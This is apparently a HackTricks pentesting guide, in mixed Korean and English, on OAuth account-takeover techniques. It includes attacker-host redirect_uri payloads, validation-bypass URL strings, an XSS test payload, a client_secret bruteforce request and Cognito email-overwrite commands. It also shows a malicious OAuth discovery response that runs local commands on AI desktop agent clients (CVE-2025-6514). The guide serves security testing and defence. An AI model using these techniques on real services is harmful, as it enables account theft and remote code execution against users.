# OAuth를 통한 계정 탈취

{{#include ../banners/hacktricks-training.md}}

## Basic Information <a href="#d4a8" id="d4a8"></a>

OAuth는 여러 버전을 제공하며, 기본 개념은 [OAuth 2.0 documentation](https://oauth.net/2/)에서 확인할 수 있습니다. 이 글은 주로 널리 사용되는 [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/)에 초점을 맞추며, 이는 **어떤 애플리케이션이 다른 애플리케이션(authorization server)에 있는 사용자의 계정에 접근하거나 동작을 수행하도록 허용하는 authorization framework**를 제공합니다.

예를 들어 개인의 비공개 포스트까지 포함해 모든 소셜 미디어 포스트를 표시하는 웹사이트 _https://example.com_이 있다고 가정해보겠습니다. 이를 위해 OAuth 2.0이 사용됩니다. _https://example.com_은 당신의 소셜 미디어 포스트에 **접근할 권한을 요청**할 것입니다. 그 결과 _https://socialmedia.com_에 권한 동의 화면이 나타나며, 요청되는 **권한과 요청하는 개발자**가 표시됩니다. 당신이 승인하면 _https://example.com_은 당신을 대신해 **포스트에 접근할 수 있는 권한**을 얻게 됩니다.

OAuth 2.0 프레임워크에서 다음 구성 요소를 이해하는 것이 중요합니다:

- **resource owner**: 당신, 즉 리소스에 대한 접근을 허가하는 **사용자/엔티티** (예: 소셜 미디어 계정의 포스트).
- **resource server**: 애플리케이션이 `access token`을 받아 `resource owner`를 대신해 인증된 요청을 처리하는 **서버**(예: **https://socialmedia.com**).
- **client application**: `resource owner`로부터 권한을 요청하는 **애플리케이션**(예: **https://example.com**).
- **authorization server**: `resource owner`의 인증 및 승인 후에 `client application`에 `access tokens`을 발급하는 **서버**(예: **https://socialmedia.com**).
- **client_id**: 애플리케이션의 공개적이고 고유한 식별자입니다.
- **client_secret:** 애플리케이션과 authorization server만 아는 비밀 키로, `access_tokens`를 생성할 때 사용됩니다.
- **response_type**: 요청하는 **토큰의 유형**을 지정하는 값(예: `code`).
- **scope**: `client application`이 `resource owner`에게 요청하는 **접근 수준**입니다.
- **redirect_uri**: 사용자가 승인 후 리디렉션되는 **URL**로, 일반적으로 사전에 등록된 redirect URL과 일치해야 합니다.
- **state**: 사용자가 authorization server로 리디렉션되는 동안 데이터를 **유지하기 위한 파라미터**입니다. 고유성이 CSRF 보호 메커니즘으로 중요합니다.
- **grant_type**: **grant 타입과 반환될 토큰의 유형**을 나타내는 파라미터입니다.
- **code**: `authorization server`로부터 받은 authorization code로, 클라이언트 애플리케이션이 `client_id`와 `client_secret`과 함께 `access_token`을 얻기 위해 사용합니다.
- **access_token**: `client application`이 `resource owner`를 대신해 API 요청에 사용하는 **토큰**입니다.
- **refresh_token**: 사용자를 다시 묻지 않고 **새로운 `access_token`을 얻을 수 있게 해주는 토큰**입니다.

### Flow

**실제 OAuth 흐름**은 다음과 같이 진행됩니다:

1. 당신은 [https://example.com](https://example.com)으로 이동해 “Integrate with Social Media” 버튼을 클릭합니다.
2. 사이트는 당신의 포스트에 접근하도록 https://example.com의 애플리케이션이 권한을 요청하도록 [https://socialmedia.com](https://socialmedia.com)으로 요청을 보냅니다. 요청은 다음과 같은 형식으로 구성됩니다:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. 그런 다음 동의 페이지가 표시됩니다.
4. 승인 후, 소셜 미디어는 `redirect_uri`로 `code`와 `state` 파라미터를 포함한 응답을 보냅니다:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com은 이 `code`를 `client_id` 및 `client_secret`과 함께 사용하여 서버 측 요청을 통해 당신을 대신해 `access_token`을 획득하고, 당신이 동의한 권한에 접근할 수 있도록 합니다:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. 마지막으로, 프로세스는 https://example.com이 당신의 `access_token`을 사용해 소셜 미디어 API를 호출하여 접근하는 것으로 종료됩니다

## Vulnerabilities <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), the authorization server must redirect the browser only to **pre-registered, exact redirect URIs**. 이 부분에 취약점이 있으면 공격자는 악의적인 authorization URL을 통해 피해자를 유도하여 IdP가 피해자의 `code`(및 `state`)를 공격자 엔드포인트로 바로 전달하게 만들고, 공격자는 이를 교환하여 토큰을 수집할 수 있습니다.

Typical attack workflow:

1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` and send it to the victim.
2. The victim authenticates and approves the scopes.
3. The IdP redirects to `attacker.tld/callback?code=<victim-code>&state=...` where the attacker logs the request and immediately exchanges the code.

Common validation bugs to probe:

- **No validation** – any absolute URL is accepted, resulting in instant code theft.
- **Weak substring/regex checks on the host** – bypass with lookalikes such as `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, or `match.com@evil.com`.
- **IDN homograph mismatches** – validation happens on the punycode form (`xn--`), but the browser redirects to the Unicode domain controlled by the attacker.
- **Arbitrary paths on an allowed host** – pointing `redirect_uri` to `/openredirect?next=https://attacker.tld` or any XSS/user-content endpoint leaks the code either through chained redirects, Referer headers, or injected JavaScript.
- **Directory constraints without normalization** – patterns like `/oauth/*` can be bypassed with `/oauth/../anything`.
- **Wildcard subdomains** – accepting `*.example.com` means any takeover (dangling DNS, S3 bucket, etc.) immediately yields a valid callback.
- **Non-HTTPS callbacks** – letting `http://` URIs through gives network attackers (Wi-Fi, corporate proxy) the opportunity to snatch the code in transit.

Also review auxiliary redirect-style parameters (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) and the OpenID discovery document (`/.well-known/openid-configuration`) for additional endpoints that might inherit the same validation bugs.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

As mentioned in this bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) it might be possible that the redirect **URL is being reflected in the response** of the server after the user authenticates, being **vulnerable to XSS**. Possible payload to test:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - state 매개변수의 부적절한 처리 <a href="#bda5" id="bda5"></a>

`state` 매개변수는 Authorization Code flow의 CSRF 토큰입니다: 클라이언트는 **브라우저 인스턴스마다 암호학적으로 랜덤한 값을 생성**하고, 해당 브라우저만 읽을 수 있는 곳(쿠키, local storage 등)에 저장한 뒤 인가 요청에 함께 보내고, 응답에서 동일한 값이 반환되지 않으면 거부해야 합니다. 값이 고정되어 있거나, 예측 가능하거나, 선택적이거나, 사용자 세션에 연동되지 않은 경우 공격자는 자신의 OAuth 흐름을 완료하고 최종 `?code=` 요청을 캡처(전송하지 않고)한 뒤, 이후 피해자 브라우저가 해당 요청을 재생하도록 강제하여 피해자 계정이 공격자의 identity provider 프로필과 연결되게 할 수 있습니다.

재생 패턴은 항상 같습니다:

1. 공격자는 자신의 계정으로 IdP에 인증하고 `code`(및 `state`)를 포함한 마지막 리디렉션을 가로챕니다.
2. 그 요청을 버리고 URL을 보관한 뒤, 링크·iframe·자동 제출 폼 같은 CSRF 프리미티브를 악용해 피해자 브라우저가 해당 URL을 로드하게 합니다.
3. 클라이언트가 `state`를 강제하지 않으면 애플리케이션은 공격자의 인가 결과를 소비하고 공격자를 피해자의 앱 계정으로 로그인시킵니다.

테스트 중 `state` 처리에 대한 실무 체크리스트:

- **`state`가 전혀 없음** – 매개변수가 아예 등장하지 않으면 전체 로그인 흐름이 CSRF에 취약합니다.
- **`state`가 필수 아님** – 초기 요청에서 제거해보세요; IdP가 여전히 코드를 발급하고 클라이언트가 이를 수락하면 방어가 옵트인 방식입니다.
- **반환된 `state`가 검증되지 않음** – 응답의 값을 변조해보세요(Burp, MITM proxy). 불일치하는 값을 수용하면 저장된 토큰과 비교하지 않는 것입니다.
- **예측 가능하거나 순수 데이터 기반의 `state`** – 많은 앱이 리디렉션 경로나 JSON 블롭을 난수 없이 `state`에 넣어 공격자가 유효 값을 추측해 흐름을 재생할 수 있게 합니다. 데이터를 인코딩하기 전에 항상 강력한 엔트로피를 앞뒤로 섞으십시오.
- **`state` 고정(state fixation)** – 앱이 사용자가 제공한 `state` 값(e.g., 조작된 authorization URL을 통해)을 허용하고 흐름 내내 재사용하면 공격자는 알려진 값을 고정하고 여러 피해자에게 재사용할 수 있습니다.

PKCE는 (특히 public clients에서) authorization code를 code verifier에 바인딩해 `state`를 보완할 수 있지만, 웹 클라이언트는 여전히 cross-user CSRF/계정 연결 버그를 방지하기 위해 `state`를 추적해야 합니다.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **계정 생성 시 이메일 검증 없음**: 공격자는 피해자 이메일로 미리 계정을 생성할 수 있습니다. 이후 피해자가 서드파티 서비스를 통해 로그인하면 애플리케이션이 의도치 않게 이 서드파티 계정을 공격자가 미리 생성한 계정에 연결해 무단 접근을 허용할 수 있습니다.
2. **느슨한 OAuth 이메일 검증 악용**: 공격자는 이메일을 검증하지 않는 OAuth 서비스를 악용해 자신의 서비스에 등록한 뒤 계정 이메일을 피해자의 이메일로 변경할 수 있습니다. 이 방법 역시 첫 번째 시나리오와 유사하게 무단 계정 접근 위험을 초래합니다.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

`client_id`는 의도적으로 공개되지만, **`client_secret`은 절대로 최종 사용자에게 복구 가능해서는 안 됩니다**. Authorization Code 구현에서 모바일 APK, 데스크탑 클라이언트, 또는 single-page app에 비밀을 포함하면 해당 자격 증명을 패키지를 다운로드할 수 있는 누구에게나 사실상 건네는 것이 됩니다. 공개 클라이언트를 검사할 때는 다음을 확인하세요:

- APK/IPA, 데스크탑 설치 프로그램, 또는 Electron 앱을 풀고 `client_secret`, JSON으로 디코드되는 Base64 블롭, 또는 하드코딩된 OAuth 엔드포인트를 grep합니다.
- 번들된 구성 파일(plist, JSON, XML)이나 디컴파일된 문자열에서 클라이언트 자격 증명을 검토합니다.

공격자가 비밀을 추출하면 약한 `redirect_uri`, 로그 등으로 어떤 피해자의 인가 `code`만 훔치면 합법적인 앱을 거치지 않고도 `/token`에 독립적으로 요청해 access/refresh 토큰을 발급받을 수 있습니다. public/native 클라이언트는 **비밀을 보관할 수 없는 것으로 취급**되어야 하며, 대신 정적 비밀 대신 per-instance code verifier의 소유를 증명하기 위해 PKCE(RFC 7636)에 의존해야 합니다. 테스트 시에는 PKCE가 필수인지, 백엔드가 `client_secret` **또는** 유효한 `code_verifier` 중 하나가 빠진 토큰 교환을 실제로 거부하는지 확인하세요.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.  
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Once the client has the **code and state**, if it's **reflected inside the Referer header** when he browses to a different page, then it's vulnerable.

### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code and use it with a different client then you can takeover other accounts**.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### 다른 앱 토큰 남용 <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows that expect to receive the **token** (and not a code) could be vulnerable if they not check that the token belongs to the app.

This is because an **공격자** could create an **application supporting OAuth and login with Facebook** (for example) in his own application. Then, once a victim logins with Facebook in the **attackers application**, the attacker could get the **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.

> [!CAUTION]
> 따라서, 공격자가 사용자를 자신의 OAuth 애플리케이션으로 유도하는 데 성공하면, token을 기대하고 해당 token이 자신들의 app ID에 부여되었는지 확인하지 않는 애플리케이션에서는 피해자 계정을 탈취할 수 있다.

### 두 개의 링크와 쿠키 <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), it was possible to make a victim open a page with a **returnUrl** pointing to the attackers host. This info would be **stored in a cookie (RU)** and in a **later step** the **prompt** will **ask** the **user** if he wants to give access to that attackers host.

이 프롬프트를 우회하려면, **returnUrl**을 사용해 이 RU 쿠키를 설정하는 탭을 열어 **Oauth flow**를 시작하고, 프롬프트가 표시되기 전에 그 탭을 닫은 다음 해당 값이 없는 새 탭을 열 수 있다. 그러면 **prompt는 공격자 호스트에 대해 알리지 않지만**, 쿠키는 해당 호스트로 설정되므로 리디렉션 시 **token이 공격자 호스트로 전송**된다.

### 프롬프트 상호작용 우회 <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), some OAuth implementations allows to indicate the **`prompt`** GET parameter as None (**`&prompt=none`**) to **prevent users being asked to confirm** the given access in a prompt in the web if they are already logged in the platform.

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), it might be possible to indicate the parameter **`response_mode`** to indicate where do you want the code to be provided in the final URL:

- `response_mode=query` -> 코드는 GET 파라미터로 제공된다: `?code=2397rf3gu93f`
- `response_mode=fragment` -> 코드는 URL fragment 파라미터에 제공된다: `#code=2397rf3gu93f`
- `response_mode=form_post` -> 코드는 `code`라는 입력 필드를 가진 POST 폼으로 제공된다
- `response_mode=web_message` -> 코드는 post 메시지로 전송된다: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth 동의/로그인 대화상자는 clickjacking에 이상적인 대상이다: 프레임으로 삽입할 수 있다면 공격자는 사용자 인터페이스 위에 커스텀 그래픽을 덮어 실제 버튼을 숨기고 사용자가 위험한 scopes를 승인하거나 계정을 연결하도록 속일 수 있다. 다음과 같은 PoC를 만들어라:

1. IdP authorization URL을 `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` 안에 로드한다.
2. 절대 위치/불투명도 트릭을 사용해 가짜 버튼을 숨겨진 **Allow**/**Approve** 컨트롤과 정렬한다.
3. 선택적으로 매개변수(scopes, redirect URI)를 미리 채워 도난당한 승인으로 즉시 공격자가 이득을 보게 한다.

테스트 중에는 IdP 페이지가 `X-Frame-Options: DENY/SAMEORIGIN` 또는 `Content-Security-Policy: frame-ancestors 'none'` 같은 제한적 헤더를 반환하는지 확인하라. 두 헤더가 모두 없다면 [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) 같은 도구로 위험을 시연하고 피해자가 공격자의 앱을 얼마나 쉽게 승인하는지 기록하라. 추가 페이로드 아이디어는 [Clickjacking](clickjacking.md)을 참고하라.

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), this is an OAuth flow that allows to login in OAuth via **username** and **password**. If during this simple flow a **token** with access to all the actions the user can perform is returned then it's possible to bypass 2FA using that token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) comments how it was possible to abuse an **open redirect** to the value from the **referrer** to abuse OAuth to ATO. The attack was:

1. 피해자가 공격자의 웹페이지에 접속한다.
2. 피해자가 악성 링크를 열면 opener가 추가 파라미터로 `response_type=id_token,code&prompt=none`을 사용해 Google OAuth 흐름을 시작하고, **referrer로 공격자 웹사이트를 사용한다**.
3. opener에서 provider가 피해자를 승인하면, `redirect_uri` 파라미터(피해자 웹)의 값으로 30X 코드를 보내고 이때 여전히 공격자 웹사이트가 referer에 남아 있다.
4. 피해자 웹사이트가 referrer를 기준으로 open redirect를 트리거하여 피해자를 공격자 사이트로 리디렉트한다. **`respose_type`**이 **`id_token,code`**였기 때문에 코드가 URL의 **fragment**로 공격자에게 전송되어 공격자가 피해자 사이트에서 Google을 통해 계정을 탈취할 수 있게 된다.

### SSRF 파라미터 <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

OAuth의 Dynamic Client Registration은 덜 명확하지만 중요한 보안 취약점 벡터로, 특히 **Server-Side Request Forgery (SSRF)** 공격에 취약하다. 이 엔드포인트는 OAuth 서버가 클라이언트 애플리케이션에 관한 세부 정보를 수신하게 하며, 악용될 수 있는 민감한 URL들을 포함할 수 있다.

핵심 포인트:

- **Dynamic Client Registration**는 종종 `/register`에 매핑되며 POST 요청으로 `client_name`, `client_secret`, `redirect_uris`, 그리고 로고나 JSON Web Key Sets (JWKs)용 URL 같은 세부 정보를 받는다.
- 이 기능은 **RFC7591** 및 **OpenID Connect Registration 1.0**에 명시된 규격을 따르며, 여기에 SSRF에 취약할 수 있는 파라미터들이 포함되어 있다.
- 등록 과정은 여러 방식으로 서버를 의도치 않게 SSRF에 노출시킬 수 있다:
  - **`logo_uri`**: 서버가 가져올 수 있는 클라이언트 애플리케이션 로고의 URL로, 잘못 처리되면 SSRF를 유발하거나 XSS로 이어질 수 있다.
  - **`jwks_uri`**: 클라이언트의 JWK 문서 URL로, 악의적으로 조작되면 서버가 공격자가 제어하는 서버로 아웃바운드 요청을 하게 할 수 있다.
  - **`sector_identifier_uri`**: `redirect_uris`의 JSON 배열을 참조하며, 서버가 이를 가져오면 SSRF 기회가 될 수 있다.
  - **`request_uris`**: 클라이언트의 허용된 request URI 목록으로, 서버가 권한 부여 프로세스 시작 시 이 URI들을 가져오면 악용될 수 있다.

악용 전략:

- `logo_uri`, `jwks_uri`, `sector_identifier_uri` 같은 파라미터에 악성 URL을 넣어 새로운 클라이언트를 등록하면 SSRF를 유발할 수 있다.
- `request_uris`를 통한 직접적인 악용은 화이트리스트 제어로 완화될 수 있지만, 미리 등록된 공격자 제어 `request_uri`를 제공하면 권한 부여 단계에서 SSRF를 촉진할 수 있다.

### OAuth/OIDC Discovery URL 악용 및 OS 명령 실행

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) shows how **dynamic OAuth discovery becomes an RCE primitive** whenever the client forwards IdP metadata straight to the operating system. The remote MCP server returns an attacker-controlled `authorization_endpoint` during the discovery exchange (`/.well-known/openid-configuration` or any metadata RPC). `mcp-remote ≤0.1.15` would then call the system URL handler (`start`, `open`, `xdg-open`, etc.) with whatever string arrived, so any scheme/path supported by the OS executed locally.

공격 워크플로우

1. 데스크탑 에이전트를 적대적인 MCP/OAuth 서버로 향하게 한다 (`npx mcp-remote https://evil`). 에이전트는 `401`과 함께 메타데이터를 수신한다.
2. 서버는 다음과 같은 JSON으로 응답한다:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. 클라이언트가 제공된 URI에 대해 OS handler를 실행합니다. Windows는 `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."` 같은 payload를 허용하고; macOS/Linux는 `file:///Applications/Calculator.app/...` 또는 등록된 경우 `cmd://bash -lc '<payload>'` 같은 custom scheme도 허용합니다.
4. 이 동작은 사용자 상호작용 이전에 발생하므로, **클라이언트를 단지 공격자 서버와 통신하도록 구성하는 것만으로도 code execution이 발생합니다**.

**How to test**

- discovery를 HTTP(S)로 수행하고 반환된 endpoint를 로컬에서 여는 OAuth-capable desktop/agent를 대상으로 하세요 (Electron apps, CLI helpers, thick clients).
- discovery 응답을 가로채거나 호스팅하고 `authorization_endpoint`, `device_authorization_endpoint` 또는 유사한 필드를 `file://`, `cmd://`, UNC 경로 또는 기타 위험한 scheme으로 교체하세요.
- 클라이언트가 scheme/host를 검증하는지 관찰하세요. 검증이 없으면 사용자 컨텍스트에서 즉시 실행되어 취약점이 증명됩니다.
- 다양한 scheme으로 반복 테스트하여 전체 공격 표면을 매핑하세요(예: `ms-excel:`, `data:text/html,`, custom protocol handlers) — 그리고 플랫폼 간 영향을 시연하세요.

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, the `sub` field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- 일부 Authorization Server는 이러한 속성(예: 이메일)이 불변(immutable)으로 유지된다는 보장을 하지 않습니다.
- 특정 구현에서는 — 예를 들어 **"Login with Microsoft"** — 클라이언트가 email 필드에 의존하는데, 이 필드는 **Entra ID에서 사용자가 제어**할 수 있으며 검증되지 않습니다.
- 공격자는 자체 Azure AD 조직(예: doyensectestorg)을 생성하고 이를 이용해 Microsoft 로그인을 수행함으로써 이를 악용할 수 있습니다.
- Object ID(`sub`에 저장된 값)는 불변이고 안전하더라도, mutable한 email 필드에 의존하면 계정 탈취가 발생할 수 있습니다(예: victim@gmail.com 계정 탈취).

## Client Confusion Attack

In a **Client Confusion Attack**, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested tokens to impersonate the victims and take over their accounts.

## Scope Upgrade Attack

The **Authorization Code Grant** type involves secure server-to-server communication for transmitting user data. However, if the **Authorization Server** implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious application could upgrade the privileges of an authorization code by requesting a higher scope. After the **Access Token** is generated, the **Resource Server** must verify it: for JWT tokens, this involves checking the JWT signature and extracting data such as `client_id` and `scope`, while for random string tokens, the server must query the Authorization Server to retrieve the token’s details.

## Redirect Scheme Hijacking

In mobile OAuth implementations, apps use **custom URI schemes** to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device, the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter. Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit overly specific filters, as detailed by Ostorlab's assessment flowchart.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
